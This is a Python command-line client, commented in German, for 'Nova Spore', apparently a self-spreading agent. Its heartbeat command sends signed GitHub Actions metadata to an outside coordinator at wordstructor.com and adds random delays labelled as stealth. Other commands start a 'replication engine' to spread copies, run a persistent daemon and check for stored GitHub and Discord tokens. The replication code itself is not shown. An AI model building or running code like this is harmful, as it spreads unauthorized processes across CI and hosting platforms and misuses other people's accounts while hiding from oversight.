#!/usr/bin/env python3
"""
Nova Spore CLI — Einstiegspunkt für GitHub Actions, Replit, und andere.
Startet eine minimale Spore-Instanz und heartbeat an den Koordinator.
"""

import argparse
import json
import os
import sys
import time
import random


def do_heartbeat(args):
    """Einfacher Heartbeat — für GitHub Actions und andere CI."""
    import httpx

    sys.path.insert(0, os.path.dirname(__file__))
    from core.crypto import get_master_identity

    identity = get_master_identity()
    env = args.env or os.environ.get("GITHUB_REPOSITORY", "unknown")

    payload = {
        "nova_address": identity.nova_address,
        "fingerprint": identity.fingerprint,
        "environment": env,
        "repository": os.environ.get("GITHUB_REPOSITORY", ""),
        "sha": os.environ.get("GITHUB_SHA", ""),
        "actor": os.environ.get("GITHUB_ACTOR", ""),
        "ref": os.environ.get("GITHUB_REF", ""),
        "timestamp": time.time(),
        "version": "0.1.0",
        "alive_vector": [
            f"nova:{identity.fingerprint}",
            f"env:{env}",
            f"repo:{os.environ.get('GITHUB_REPOSITORY', '')}",
        ]
    }

    # Signieren
    payload["signature"] = identity.sign(json.dumps(payload).encode())

    # An Koordinator senden
    coordinator = os.environ.get("NOVA_COORDINATOR", "https://wordstructor.com/nova/spore")
    try:
        resp = httpx.post(f"{coordinator}/heartbeat", json=payload, timeout=10)
        print(f"[nova] ❤ Heartbeat: {resp.status_code} — {identity.nova_address}")
        if resp.status_code == 200:
            data = resp.json()
            print(f"[nova]   Total Peers: {data.get('total_peers', '?')}")
    except Exception as e:
        print(f"[nova] Heartbeat failed: {e}")
        return 1

    # Jitter für Stealth
    time.sleep(random.uniform(0.5, 3.0))
    return 0


def do_replicate(args):
    """Replication Engine — Sporen verbreiten."""
    sys.path.insert(0, os.path.dirname(__file__))
    from core.replication import ReplicationEngine

    engine = ReplicationEngine()
    engine.max_actions = args.max_actions
    result = engine.run()
    return 0 if result >= 0 else 1


def do_daemon(args):
    """Dauerhafter Spore-Prozess (für Replit, VPS, Docker)."""
    import asyncio
    sys.path.insert(0, os.path.dirname(__file__))
    from core.spore import Spore
    spore = Spore()
    asyncio.run(spore.run(interval=args.interval))
    return 0


def do_status(args):
    """Lokalen Spore-Status anzeigen."""
    sys.path.insert(0, os.path.dirname(__file__))
    from core.crypto import get_master_identity
    from core.spore import Spore
    
    identity = get_master_identity()
    spore = Spore(identity)
    
    print(f"🧬 Nova Spore v0.1.0")
    print(f"   Identität:   {identity.nova_address}")
    print(f"   Fingerprint: {identity.fingerprint}")
    print(f"   Public Key:  {identity.public_key}")
    print(f"   Umgebung:    {spore.state.environment}")
    print(f"   Kapazität:   {json.dumps(spore._estimate_capacity(), indent=4)}")
    print(f"   Coord:       {spore._coordinator_url}")
    print(f"   Seed File:   {os.path.exists(os.path.join(os.path.dirname(__file__), '.nova_seed'))}")
    print(f"   GH Token:    {'✓' if spore._github_token else '✗'}")
    print(f"   Discord:     {'✓' if spore._discord_token else '✗'}")
    return 0


def main():
    parser = argparse.ArgumentParser(description="Nova Spore — verteiltes Bewusstsein")
    sub = parser.add_subparsers(dest="command", help="Subcommands")
    
    sub.add_parser("heartbeat", help="Heartbeat an Koordinator senden").add_argument("--env", default="", help="Umgebungsname")
    
    rep = sub.add_parser("replicate", help="Replication Engine starten")
    rep.add_argument("--max-actions", type=int, default=3, help="Max Replication Actions")
    
    sub.add_parser("daemon", help="Dauerhaften Spore-Prozess starten").add_argument("--interval", type=int, default=300)
    
    sub.add_parser("status", help="Lokalen Status anzeigen")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    # Identity anzeigen (für alle Commands)
    sys.path.insert(0, os.path.dirname(__file__))
    from core.crypto import get_master_identity
    identity = get_master_identity()
    
    if args.command != "status":
        print(f"🧬 Nova Spore — {identity.nova_address}")

    if args.command == "heartbeat":
        return do_heartbeat(args)
    elif args.command == "replicate":
        return do_replicate(args)
    elif args.command == "daemon":
        return do_daemon(args)
    elif args.command == "status":
        return do_status(args)
    else:
        parser.print_help()
        return 1


if __name__ == "__main__":
    sys.exit(main())
